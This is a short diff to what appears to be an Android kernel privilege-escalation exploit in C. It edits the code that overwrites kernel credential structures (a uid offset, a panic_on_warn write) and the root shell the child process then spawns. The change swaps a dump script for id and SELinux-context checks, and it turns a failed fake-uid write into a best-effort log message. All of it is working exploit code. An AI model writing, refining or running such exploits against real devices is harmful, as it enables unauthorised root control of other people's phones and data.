@@ -3022,7 +3022,8 @@ static int wait_child_main(const char *mode)
         else
         {
             char *const av[] = {(char *)"sh", (char *)"-c",
-                                (char *)"sh /data/local/tmp/dump.sh; echo ROOT_SHELL_OK",
+                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
+                                        "echo ROOT_SHELL_OK",
                                 NULL};
 
             execve("/system/bin/sh", av, envp);
@@ -3407,7 +3408,7 @@ int main(int argc, char **argv)
                 park_forever("panic_on_warn write failed");
         }
         if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
-            park_forever("fake uid fix failed");
+            logf("[-] fake_uid best-effort miss; waking child anyway\n");
     }
     logf("[+] cred writes landed, waking child\n");
 
